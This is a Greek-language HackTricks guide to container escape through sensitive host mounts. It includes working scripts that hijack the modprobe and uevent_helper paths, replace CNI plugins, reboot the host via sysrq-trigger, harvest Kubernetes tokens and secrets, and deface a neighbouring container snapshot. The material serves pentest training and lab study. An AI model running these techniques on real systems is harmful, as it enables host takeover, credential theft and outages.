# Ευαίσθητα mounts του host

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα mounts του host είναι από τις σημαντικότερες πρακτικές επιφάνειες container-escape, επειδή συχνά αναιρούν την προσεκτικά απομονωμένη ορατότητα μιας διεργασίας και της δίνουν άμεση πρόσβαση σε πόρους του host. Οι επικίνδυνες περιπτώσεις δεν περιορίζονται στο `/`. Τα bind mounts των `/proc`, `/sys`, `/var`, των runtime sockets, της κατάστασης που διαχειρίζεται το kubelet ή διαδρομών σχετικών με συσκευές μπορεί να εκθέσουν ελέγχους του kernel, διαπιστευτήρια, filesystems γειτονικών containers και interfaces διαχείρισης του runtime.

Αυτή η σελίδα υπάρχει ξεχωριστά από τις επιμέρους σελίδες προστασίας, επειδή το μοντέλο κατάχρησης αφορά πολλούς τομείς. Ένα writable mount του host είναι επικίνδυνο εν μέρει λόγω των mount namespaces, εν μέρει λόγω των user namespaces, εν μέρει λόγω της κάλυψης από AppArmor ή SELinux και εν μέρει λόγω της ακριβούς διαδρομής του host που εκτέθηκε. Η αντιμετώπισή του ως ξεχωριστού θέματος διευκολύνει σημαντικά την ανάλυση της επιφάνειας επίθεσης.

Συγκρίνετε επίσης έναν writable κατάλογο του host με την αντίστοιχη διαδρομή μέσα σε κάθε container. Αν έχει γίνει mount πάνω σε κατάλογο με εκτελέσιμα startup scripts, ένας χρήστης του host με χαμηλότερα δικαιώματα μπορεί να τοποθετήσει κώδικα που θα φορτώσει το entrypoint ενός container με υψηλότερα δικαιώματα στην επόμενη επανεκκίνησή του. Επιβεβαιώστε την ακριβή πηγή και τον προορισμό του bind, τα δικαιώματα εγγραφής και αναζήτησης στον κατάλογο, τον βρόχο του entrypoint και την απαίτηση για εκτελέσιμο αρχείο, το UID του runtime και την ύπαρξη πραγματικού μηχανισμού επανεκκίνησης. Το UID 0 του container δεν είναι αυτομάτως UID 0 του host· το αποτέλεσμα στον host καθορίζεται από την αντιστοίχιση user namespace και την πολιτική mount. Η παθητική επισκόπηση πρέπει να αναφέρει διαδρομές και δικαιώματα χωρίς να γράφει script ή να επανεκκινεί το workload.

Ένα Linux container μπορεί να εκτελείται μέσα σε VM διαχείρισης που μοιράζεται μέρος ενός ξεχωριστού filesystem του host Windows. Οι [κοινόχρηστοι φάκελοι του VirtualBox](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) είναι ένας τρόπος να γίνουν ορατά αρχεία του host σε ένα guest, αλλά το root σε εκείνο το VM εξακολουθεί να είναι διαφορετική ταυτότητα από έναν διαχειριστή Windows. Αν το share εκθέτει το ιδιωτικό SSH key ενός χρήστη με δικαίωμα ανάγνωσης, θεωρήστε το ένδειξη για πιθανό credential: επαληθεύστε το ακριβές mount που αντιστοιχεί στον host, την ιδιοκτησία και τα δικαιώματα πρόσβασης του key, τον αντίστοιχο λογαριασμό και την **ενεργή** πολιτική authorized-key του SSH server των Windows, πριν συμπεράνετε ότι επιτρέπει σύνδεση στον host. Το σύγχρονο [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) χρησιμοποιεί συνήθως ξεχωριστό αρχείο `administrators_authorized_keys` για λογαριασμούς διαχειριστών. Μην συμπεριλαμβάνετε το περιεχόμενο ιδιωτικών keys στα συνηθισμένα αποτελέσματα απαρίθμησης· για παθητική αρχική αξιολόγηση αρκούν τα metadata του mount και της διαδρομής του key.

## Έκθεση του `/proc`

Το procfs περιέχει τόσο συνηθισμένες πληροφορίες διεργασιών όσο και interfaces ελέγχου του kernel με σημαντικές επιπτώσεις. Επομένως, ένα bind mount όπως το `-v /proc:/host/proc` ή μια όψη του container που εκθέτει απροσδόκητα writable entries του proc μπορεί να οδηγήσει σε αποκάλυψη πληροφοριών, άρνηση υπηρεσίας ή άμεση εκτέλεση κώδικα στον host.

Σημαντικές διαδρομές του procfs περιλαμβάνουν:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (ειδικά τα `register` και `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Κατάχρηση

Ξεκινήστε ελέγχοντας ποια σημαντικά entries του procfs είναι ορατά ή writable:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Αυτές οι διαδρομές είναι ενδιαφέρουσες για διαφορετικούς λόγους. Τα `core_pattern`, `modprobe` και `binfmt_misc` μπορούν να γίνουν διαδρομές εκτέλεσης κώδικα στο host όταν είναι εγγράψιμα. Τα `kallsyms`, `kmsg`, `kcore` και `config.gz` είναι ισχυρές πηγές αναγνώρισης για kernel exploitation. Τα `sched_debug` και `mountinfo` αποκαλύπτουν πληροφορίες για διεργασίες, cgroup και filesystem, οι οποίες μπορούν να βοηθήσουν στην ανακατασκευή της διάταξης του host μέσα από το container.

Η πρακτική αξία κάθε διαδρομής διαφέρει, και το να τις αντιμετωπίζουμε όλες σαν να έχουν τον ίδιο αντίκτυπο δυσκολεύει το triage:

- `/proc/sys/kernel/core_pattern`
  Αν είναι εγγράψιμο, είναι μία από τις διαδρομές procfs με τον μεγαλύτερο αντίκτυπο, επειδή ο kernel εκτελεί έναν pipe handler μετά από crash. Ένα container που μπορεί να ορίσει το `core_pattern` ώστε να δείχνει σε payload αποθηκευμένο στο overlay του ή σε προσαρτημένη διαδρομή του host μπορεί συχνά να αποκτήσει εκτέλεση κώδικα στο host. Δείτε επίσης το [read-only-paths.md](protections/read-only-paths.md) για ένα σχετικό παράδειγμα.
- `/proc/sys/kernel/modprobe`
  Αυτή η διαδρομή ελέγχει το helper του χώρου χρήστη που χρησιμοποιεί ο kernel όταν χρειάζεται να καλέσει τη λογική φόρτωσης modules. Αν είναι εγγράψιμη από το container και ερμηνεύεται στο πλαίσιο του host, μπορεί να γίνει ένας ακόμη μηχανισμός εκτέλεσης κώδικα στο host. Είναι ιδιαίτερα ενδιαφέρουσα όταν συνδυάζεται με τρόπο ενεργοποίησης της διαδρομής του helper.
- `/proc/sys/vm/panic_on_oom`
  Συνήθως δεν αποτελεί καθαρό primitive διαφυγής, αλλά μπορεί να μετατρέψει την πίεση μνήμης σε άρνηση υπηρεσίας σε όλο το host, μετατρέποντας τις συνθήκες OOM σε συμπεριφορά kernel panic.
- `/proc/sys/fs/binfmt_misc`
  Αν η διεπαφή καταχώρισης είναι εγγράψιμη, ο attacker μπορεί να καταχωρίσει handler για μια επιλεγμένη magic value και να αποκτήσει εκτέλεση στο πλαίσιο του host όταν εκτελεστεί ένα αντίστοιχο αρχείο.
- `/proc/config.gz`
  Χρήσιμο για triage kernel exploit. Βοηθά να διαπιστωθεί ποια subsystems, mitigations και προαιρετικές δυνατότητες του kernel είναι ενεργοποιημένα, χωρίς να χρειάζονται τα metadata των πακέτων του host.
- `/proc/sysrq-trigger`
  Κυρίως διαδρομή άρνησης υπηρεσίας, αλλά πολύ σοβαρή. Μπορεί να κάνει άμεση επανεκκίνηση, panic ή να διαταράξει με άλλον τρόπο το host.
- `/proc/kmsg`
  Αποκαλύπτει μηνύματα του kernel ring buffer. Είναι χρήσιμο για fingerprinting του host, ανάλυση crash και, σε ορισμένα περιβάλλοντα, για leak πληροφοριών που βοηθούν στο kernel exploitation.
- `/proc/kallsyms`
  Είναι πολύτιμο όταν είναι αναγνώσιμο, επειδή εκθέτει πληροφορίες για τα exported kernel symbols και μπορεί να βοηθήσει στην παράκαμψη υποθέσεων περί τυχαιοποίησης διευθύνσεων κατά την ανάπτυξη kernel exploit.
- `/proc/[pid]/mem`
  Πρόκειται για άμεση διεπαφή στη μνήμη διεργασίας. Αν η διεργασία-στόχος είναι προσβάσιμη υπό τις απαραίτητες συνθήκες τύπου ptrace, μπορεί να επιτρέψει την ανάγνωση ή τροποποίηση της μνήμης άλλης διεργασίας. Ο πραγματικός αντίκτυπος εξαρτάται σε μεγάλο βαθμό από τα credentials, το `hidepid`, το Yama και τους περιορισμούς ptrace, οπότε πρόκειται για ισχυρή αλλά υπό προϋποθέσεις διαδρομή.
- `/proc/kcore`
  Εκθέτει μια απεικόνιση της μνήμης του συστήματος τύπου core image. Το αρχείο είναι τεράστιο και δύσχρηστο, αλλά αν είναι ουσιαστικά αναγνώσιμο, υποδηλώνει ότι η επιφάνεια μνήμης του host είναι επικίνδυνα εκτεθειμένη.
- `/dev/kmem` και `/dev/mem`
  Πρόκειται για raw-memory διεπαφές **συσκευών**, με ιστορικά μεγάλο αντίκτυπο, όχι για αρχεία procfs. Σε πολλά σύγχρονα συστήματα απουσιάζουν ή υπόκεινται σε αυστηρούς περιορισμούς, αλλά ένα container που μπορεί να ανοίξει ένα αντίγραφο προσαρτημένο από το host πρέπει να αντιμετωπίσει αυτή την έκθεση ως κρίσιμη. Εξετάστε τις μαζί με άλλες ευαίσθητες προσαρτήσεις `/dev`, αντί να αναζητάτε τις ανύπαρκτες διαδρομές `/proc/kmem` ή `/proc/mem`.
- `/proc/sched_debug`
  Διαρρέει πληροφορίες για τον προγραμματισμό και τις διεργασίες, οι οποίες μπορεί να αποκαλύψουν τις ταυτότητες διεργασιών του host, ακόμη κι όταν άλλες προβολές διεργασιών φαίνονται πιο καθαρές από το αναμενόμενο.
- `/proc/[pid]/mountinfo`
  Είναι εξαιρετικά χρήσιμο για την ανακατασκευή της πραγματικής θέσης του container στο host, τον εντοπισμό των διαδρομών που υποστηρίζονται από overlay και τον προσδιορισμό του αν μια εγγράψιμη προσάρτηση αντιστοιχεί σε περιεχόμενο του host ή μόνο στο επίπεδο του container.

Αν τα `/proc/[pid]/mountinfo` ή οι λεπτομέρειες του overlay είναι αναγνώσιμα, χρησιμοποιήστε τα για να εντοπίσετε τη διαδρομή του filesystem του container στο host:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Αυτές οι εντολές είναι χρήσιμες επειδή αρκετά host-execution tricks απαιτούν τη μετατροπή μιας διαδρομής μέσα στο container στην αντίστοιχη διαδρομή από την οπτική του host.

### Παράδειγμα: Προετοιμασία διαδρομής helper για `modprobe`

Αν το `/proc/sys/kernel/modprobe` είναι εγγράψιμο από το container και η διαδρομή helper ερμηνεύεται στο πλαίσιο του host, μπορεί να ανακατευθυνθεί σε payload που ελέγχεται από τον attacker. Ο κατάλογος upper του overlay πρέπει να επιλυθεί από τον host, ενώ το αποδεικτικό output πρέπει να εγγραφεί ξανά στο ίδιο επίπεδο του container που είναι ορατό από τον host, αν το container δεν προσαρτά και το `/tmp` του host:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Το ακριβές trigger εξαρτάται από τον στόχο και τη συμπεριφορά του kernel και σκόπιμα δεν γίνεται εικασία. Επαναφέρετε την αρχική τιμή πριν φύγετε από το lab. Το σημαντικό είναι ότι μια εγγράψιμη διαδρομή helper μπορεί να ανακατευθύνει μια μελλοντική κλήση kernel helper σε περιεχόμενο διαδρομής host που ελέγχει ο attacker. Ένα overlay `upperdir` που λείπει, μια διαδρομή που δεν μπορεί να επιλύσει το host, ένα read-only sysctl mount ή ένας kernel που δεν καλεί ποτέ τον επιλεγμένο helper διακόπτουν αυτή την αλυσίδα.

### Πλήρες παράδειγμα: Αναγνώριση kernel με `kallsyms`, `kmsg` και `config.gz`

Αν ο στόχος είναι η αξιολόγηση της δυνατότητας εκμετάλλευσης και όχι η άμεση διαφυγή:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Αυτές οι εντολές βοηθούν να διαπιστώσετε αν είναι ορατές χρήσιμες πληροφορίες συμβόλων, αν πρόσφατα μηνύματα του kernel αποκαλύπτουν ενδιαφέρουσα κατάσταση και ποιες δυνατότητες ή mitigations του kernel είναι ενεργοποιημένες κατά τη μεταγλώττιση. Συνήθως δεν οδηγούν άμεσα σε escape, αλλά μπορούν να επιταχύνουν σημαντικά τη διαλογή ευπαθειών του kernel.

### Πλήρες Παράδειγμα: Επανεκκίνηση του host μέσω SysRq

Αν το `/proc/sysrq-trigger` είναι εγγράψιμο και η πρόσβαση φτάνει στο περιβάλλον του host:

```bash
echo b > /proc/sysrq-trigger
```

Η επίδραση είναι άμεση επανεκκίνηση του host. Δεν πρόκειται για διακριτικό παράδειγμα, αλλά δείχνει ξεκάθαρα ότι η έκθεση του procfs μπορεί να έχει πολύ σοβαρότερες συνέπειες από την αποκάλυψη πληροφοριών.

## Έκθεση του `/sys`

Το sysfs εκθέτει μεγάλο όγκο πληροφοριών για την κατάσταση του kernel και των συσκευών. Ορισμένες διαδρομές του sysfs είναι κυρίως χρήσιμες για fingerprinting, ενώ άλλες μπορούν να επηρεάσουν την εκτέλεση βοηθητικών προγραμμάτων, τη συμπεριφορά συσκευών, τη διαμόρφωση των security modules ή την κατάσταση του firmware.

Στις διαδρομές sysfs υψηλής αξίας περιλαμβάνονται οι εξής:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Οι διαδρομές αυτές έχουν σημασία για διαφορετικούς λόγους. Το `/sys/class/thermal` μπορεί να επηρεάσει τη συμπεριφορά διαχείρισης της θερμοκρασίας και, επομένως, τη σταθερότητα του host σε περιβάλλοντα με ανεπαρκή προστασία. Το `/sys/kernel/vmcoreinfo` μπορεί να διαρρεύσει πληροφορίες για τα crash dump και τη διάταξη του kernel, οι οποίες βοηθούν στο fingerprinting του host σε χαμηλό επίπεδο. Το `/sys/kernel/security` είναι η διεπαφή `securityfs` που χρησιμοποιούν τα Linux Security Modules, επομένως απροσδόκητη πρόσβαση εκεί μπορεί να εκθέσει ή να τροποποιήσει κατάσταση σχετική με το MAC. Οι διαδρομές μεταβλητών EFI μπορούν να επηρεάσουν ρυθμίσεις εκκίνησης που αποθηκεύονται στο firmware, γεγονός που τις καθιστά πολύ πιο επικίνδυνες από τα συνηθισμένα αρχεία διαμόρφωσης. Το `debugfs` στη διαδρομή `/sys/kernel/debug` είναι ιδιαίτερα επικίνδυνο, επειδή αποτελεί σκόπιμα μια διεπαφή προσανατολισμένη στους developers, με πολύ λιγότερες προσδοκίες ασφάλειας από τα hardened API του kernel που προορίζονται για περιβάλλοντα παραγωγής.

Κάθε καταχώριση sysfs σε αυτήν τη λίστα εξαρτάται **από τον kernel, τη διαμόρφωση και το υλικό**. Οι τρέχοντες εικονικοποιημένοι κόμβοι συχνά παραλείπουν εντελώς τα `uevent_helper`, τις μεταβλητές EFI και τις καταχωρίσεις θερμικών συσκευών. Καταγράψτε μια διαδρομή που απουσιάζει ως αρνητική προϋπόθεση, αντί να θεωρείτε δεδομένο ότι ισχύει ένα παράδειγμα από άλλον kernel.

Χρήσιμες εντολές για την εξέταση αυτών των διαδρομών είναι:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Τι κάνει αυτές τις εντολές ενδιαφέρουσες:

- Το `/sys/kernel/security` μπορεί να αποκαλύψει αν το AppArmor, το SELinux ή κάποιο άλλο LSM είναι ορατό με τρόπο που θα έπρεπε να είναι προσβάσιμος μόνο από το host.
- Το `/sys/kernel/debug` είναι συχνά το πιο ανησυχητικό εύρημα αυτής της ομάδας. Αν το `debugfs` είναι προσαρτημένο και διαθέσιμο για ανάγνωση ή εγγραφή, αναμένετε μια ευρεία επιφάνεια αλληλεπίδρασης με τον kernel, της οποίας ο ακριβής κίνδυνος εξαρτάται από τους ενεργοποιημένους κόμβους αποσφαλμάτωσης.
- Η έκθεση μεταβλητών EFI είναι λιγότερο συνηθισμένη, αλλά αν υπάρχει, έχει μεγάλο αντίκτυπο, επειδή αφορά ρυθμίσεις αποθηκευμένες στο firmware και όχι συνηθισμένα αρχεία χρόνου εκτέλεσης.
- Το `/sys/class/thermal` αφορά κυρίως τη σταθερότητα του host και την αλληλεπίδραση με το υλικό, όχι μια εύκολη διαφυγή τύπου shell.
- Το `/sys/kernel/vmcoreinfo` είναι κυρίως πηγή αποτυπώματος host και ανάλυσης καταρρεύσεων, χρήσιμη για την κατανόηση της κατάστασης του kernel σε χαμηλό επίπεδο.

### Πλήρες παράδειγμα: `uevent_helper`

Το `/sys/kernel/uevent_helper` εξαρτάται από τον kernel και τις ρυθμίσεις του και απουσιάζει από πολλά σύγχρονα συστήματα. Αν υπάρχει, είναι εγγράψιμο και είναι διαθέσιμη μια κατάλληλη ενεργοποίηση `uevent`, ο kernel ενδέχεται να εκτελέσει ένα helper που ελέγχεται από τον επιτιθέμενο. Η έξοδος απόδειξης πρέπει να χρησιμοποιεί μια διαδρομή ορατή τόσο από την πλευρά του host όσο και από την πλευρά του container:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Ο λόγος που αυτό λειτουργεί είναι ότι η διαδρομή του helper ερμηνεύεται από την οπτική του host. Μόλις ενεργοποιηθεί, ο helper εκτελείται στο context του host και όχι μέσα στο τρέχον container. Το `/sys/class/mem/null/uevent` είναι ένας συγκεκριμένος trigger σε kernels που το εκθέτουν· άλλες συσκευές ενδέχεται να εκθέτουν τα δικά τους αρχεία `uevent`, αλλά μην επιλέγετε κάποιο τυχαία σε πραγματικό hardware. Επαναφέρετε την αρχική τιμή πριν φύγετε από το lab. Μην αναφέρετε ότι αυτή η τεχνική είναι διαθέσιμη αν απουσιάζει το αρχείο helper ή ένας ελεγχόμενος trigger.

## Έκθεση του `/var`

Η προσάρτηση του `/var` του host σε ένα container συχνά υποτιμάται, επειδή δεν φαίνεται τόσο εντυπωσιακή όσο η προσάρτηση του `/`. Στην πράξη, μπορεί να αρκεί για πρόσβαση σε sockets runtime, καταλόγους snapshot των containers, volumes pod που διαχειρίζεται το kubelet, projected tokens λογαριασμών υπηρεσίας και γειτονικά filesystems εφαρμογών. Σε σύγχρονους κόμβους, το `/var` είναι συχνά το σημείο όπου βρίσκεται στην πράξη η πιο ενδιαφέρουσα επιχειρησιακά κατάσταση των containers.

### Παράδειγμα Kubernetes

Ένα pod με `hostPath: /var` μπορεί συχνά να διαβάσει projected tokens άλλων pods και περιεχόμενο snapshot από overlay:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Αυτές οι εντολές είναι χρήσιμες επειδή δείχνουν αν το mount εκθέτει μόνο αδιάφορα δεδομένα εφαρμογής ή διαπιστευτήρια cluster υψηλού αντίκτυπου. Ένα αναγνώσιμο service-account token μπορεί να μετατρέψει αμέσως την τοπική εκτέλεση κώδικα σε πρόσβαση στο Kubernetes API.

Αν υπάρχει το token, επαλήθευσε σε τι μπορεί να έχει πρόσβαση αντί να σταματήσεις μόλις εντοπίσεις το token:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Ο αντίκτυπος εδώ μπορεί να είναι πολύ μεγαλύτερος από την πρόσβαση σε έναν τοπικό κόμβο. Ένα token με ευρεία RBAC μπορεί να μετατρέψει ένα προσαρτημένο `/var` σε παραβίαση ολόκληρου του cluster.

### Παράδειγμα Docker και containerd

Σε Docker hosts, τα σχετικά δεδομένα βρίσκονται συχνά στο `/var/lib/docker`, ενώ σε κόμβους Kubernetes που βασίζονται στο containerd μπορεί να βρίσκονται στο `/var/lib/containerd` ή σε διαδρομές ειδικές για το snapshotter:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Αν το προσαρτημένο `/var` εκθέτει εγγράψιμα περιεχόμενα snapshot άλλου workload, ο εισβολέας μπορεί να είναι σε θέση να τροποποιήσει αρχεία εφαρμογών, να τοποθετήσει web περιεχόμενο ή να αλλάξει startup scripts χωρίς να αγγίξει τις ρυθμίσεις του τρέχοντος container.

Σε ένα **αναλώσιμο workload εργαστηρίου**, τα εγγράψιμα περιεχόμενα snapshot μπορούν να χρησιμοποιηθούν για να επιδειχθεί αλλοίωση εφαρμογής, ανάκτηση secrets ή lateral movement. Αντιστοιχίστε πρώτα το runtime container ID με το ακριβές snapshot και μην τροποποιείτε ποτέ άσχετο ή production snapshot:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Αυτές οι εντολές είναι χρήσιμες, επειδή δείχνουν τις τρεις βασικές κατηγορίες επιπτώσεων από την προσάρτηση του `/var`: αλλοίωση εφαρμογών, ανάκτηση μυστικών και πλευρική κίνηση σε γειτονικά workloads.

Οι απευθείας εγγραφές σε snapshot παρακάμπτουν την κανονική διαχείριση κατάστασης του runtime και μπορούν να προκαλέσουν αλλοίωση του container ή καταστροφή αποδεικτικών στοιχείων. Η ανακάλυψη μόνο για ανάγνωση αναπαράχθηκε τοπικά με το Docker `overlay2`: ένας δείκτης που γράφτηκε σε ένα γειτονικό προσωρινό container εμφανίστηκε κάτω από το `/var/lib/docker/overlay2/<id>/diff/`. Περιορίστε την πραγματική τροποποίηση snapshot σε ένα προσωρινό container που δημιουργήθηκε για τη συγκεκριμένη δοκιμή.

## Καταστάσεις Kubelet, πρόσθετα και διαδρομές CNI

Μια προσάρτηση του `/var/lib/kubelet`, του `/opt/cni/bin` ή του `/etc/cni/net.d` συχνά εκτίθεται μέσω προνομιούχων DaemonSets, CNI agents, CSI node plugins, GPU operators και βοηθητικών εργαλείων αποθήκευσης. Είναι εύκολο να απορρίψει κανείς αυτές τις προσαρτήσεις ως «υποδομή κόμβου», αλλά βρίσκονται απευθείας στη διαδρομή εκτέλεσης νέων pods και συχνά περιέχουν διαπιστευτήρια kubelet, προβαλλόμενα secrets, sockets καταχώρισης και εκτελέσιμα binaries πρόσθετων που εκτελούνται στο host.

Οι στόχοι υψηλής αξίας περιλαμβάνουν:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Χρήσιμες εντολές ελέγχου είναι οι εξής:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Γιατί έχουν σημασία αυτές οι διαδρομές:

- Το `/var/lib/kubelet/pki` μπορεί να εκθέσει πιστοποιητικά πελάτη του kubelet και άλλα διαπιστευτήρια τοπικά στον κόμβο, τα οποία μερικές φορές μπορούν να επαναχρησιμοποιηθούν για πρόσβαση στον API server ή σε TLS endpoints που εξυπηρετεί το kubelet, ανάλογα με τον σχεδιασμό του cluster.<sup>[[1]](#references)</sup>
- Το `/var/lib/kubelet/pods` συχνά περιέχει projected service-account tokens και προσαρτημένα Secrets για γειτονικά pods στον ίδιο κόμβο.
- Το `/var/lib/kubelet/pod-resources/kubelet.sock` είναι κυρίως επιφάνεια αναγνώρισης, αλλά πολύ χρήσιμη: αποκαλύπτει ποια pods και containers χρησιμοποιούν αυτήν τη στιγμή GPUs, hugepages, συσκευές SR-IOV και άλλους σπάνιους πόρους τοπικούς στον κόμβο.<sup>[[1]](#references)</sup>
- Τα `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` και `/var/lib/kubelet/plugins_registry` αποκαλύπτουν ποια CSI, DRA και device plugins είναι εγκατεστημένα και με ποια sockets αναμένεται να επικοινωνεί το kubelet. Αν αυτοί οι κατάλογοι είναι εγγράψιμοι και όχι απλώς αναγνώσιμοι, το εύρημα γίνεται πολύ σοβαρότερο.<sup>[[1]](#references)</sup>
- Τα `/opt/cni/bin` και `/etc/cni/net.d` βρίσκονται απευθείας στη διαδρομή ρύθμισης του δικτύου των pods. Η εγγράψιμη πρόσβαση εκεί συχνά αποτελεί primitive καθυστερημένης εκτέλεσης στον host και όχι απλώς έκθεση ρυθμίσεων.<sup>[[2]](#references)</sup>

### Πλήρες παράδειγμα: Εγγράψιμο `/opt/cni/bin`

Αν ένας κατάλογος δυαδικών αρχείων CNI του host είναι προσαρτημένος με δικαιώματα ανάγνωσης-εγγραφής, η αντικατάσταση ενός plugin μπορεί να αρκεί για να επιτευχθεί εκτέλεση στον host την επόμενη φορά που το kubelet δημιουργεί ένα pod sandbox σε αυτόν τον κόμβο:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Αυτό δεν είναι τόσο άμεσο όσο ένα mounted `docker.sock`, αλλά συχνά είναι πιο ρεαλιστικό σε compromised Kubernetes infrastructure pods. Ο marker γράφεται δίπλα στο mounted plugin, ώστε το container να μπορεί να τον ανακτήσει ακόμη και χωρίς mount του host-root ή του host-`/tmp`. Το wrapper διατηρεί τα αρχικά ορίσματα και το standard input, και στη συνέχεια το παράδειγμα επαναφέρει το αρχικό binary. Το σημαντικό είναι ότι το τροποποιημένο binary εκτελείται αργότερα από τη ροή ρύθμισης δικτύου του host, όχι από το τρέχον container. Χρησιμοποιήστε μόνο έναν disposable node, επειδή ένα μη έγκυρο wrapper μπορεί να εμποδίσει τα νέα Pod sandboxes να αποκτήσουν δικτύωση.

## Runtime Sockets

Τα ευαίσθητα host mounts συχνά περιλαμβάνουν runtime sockets αντί για ολόκληρους καταλόγους. Είναι τόσο σημαντικά, που αξίζει να επαναληφθούν ρητά εδώ:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Δες το [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) για πλήρεις ροές exploitation μόλις προσαρτηθεί ένα από αυτά τα sockets.

Ως ένα γρήγορο μοτίβο πρώτης αλληλεπίδρασης:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

